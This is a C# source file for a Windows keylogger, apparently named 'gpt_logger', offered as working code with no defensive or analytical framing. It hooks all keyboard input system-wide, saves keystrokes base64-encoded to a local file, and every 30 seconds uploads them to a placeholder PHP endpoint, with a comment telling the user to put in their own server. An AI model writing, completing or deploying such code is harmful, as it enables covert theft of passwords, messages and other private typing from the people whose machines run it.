using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace gpt_logger
{


    class GlobalKeyLoggerWithUpload
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static StringBuilder buffer = new StringBuilder();
        private const int BufferSize = 10;
        private static string outputFile = "keystrokes_base64.txt";

        // Upload settings
        private static string uploadUrl = "http://yourserver.com/receiver.php"; // replace with your PHP endpoint
        private static int uploadIntervalSeconds = 30; // upload every 30 seconds

        public void run()
        {
            // Start the uploader in a background thread
            Thread uploaderThread = new Thread(PeriodicUpload);
            uploaderThread.IsBackground = true;
            uploaderThread.Start();

            // Start keylogger hook
            _hookID = SetHook(_proc);
            // Application.Run()
            //Form.ShowDialog();
            //UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyPressed = ((Keys)vkCode).ToString();

                Console.Write($"{keyPressed} ");
                buffer.Append(keyPressed);

                if (buffer.Length >= BufferSize)
                {
                    bool success = SaveStringAsBase64(buffer.ToString(), outputFile);
                    Console.WriteLine($"\n[Saved Blob] Success: {success}");
                    buffer.Clear();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static bool SaveStringAsBase64(string input, string filePath)
        {
            try
            {
                byte[] bytes = Encoding.UTF8.GetBytes(input);
                string base64String = Convert.ToBase64String(bytes);

                File.AppendAllText(filePath, base64String + Environment.NewLine);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static async void PeriodicUpload()
        {
            HttpClient client = new HttpClient();

            while (true)
            {
                try
                {
                    if (File.Exists(outputFile))
                    {
                        string content = File.ReadAllText(outputFile).Trim();

                        if (!string.IsNullOrEmpty(content))
                        {
                            // Send as GET parameter ?data=
                            string url = $"{uploadUrl}?data={Uri.EscapeDataString(content)}";

                            HttpResponseMessage response = await client.GetAsync(url);
                            Console.WriteLine($"\n[Upload] Status: {response.StatusCode}");

                            // Optionally, clear the file after upload
                            
                           // File.WriteAllText(outputFile, string.Empty);
                        }
                        
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Upload Error] {ex.Message}");
                }
                
                Thread.Sleep(uploadIntervalSeconds * 1000);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }

}
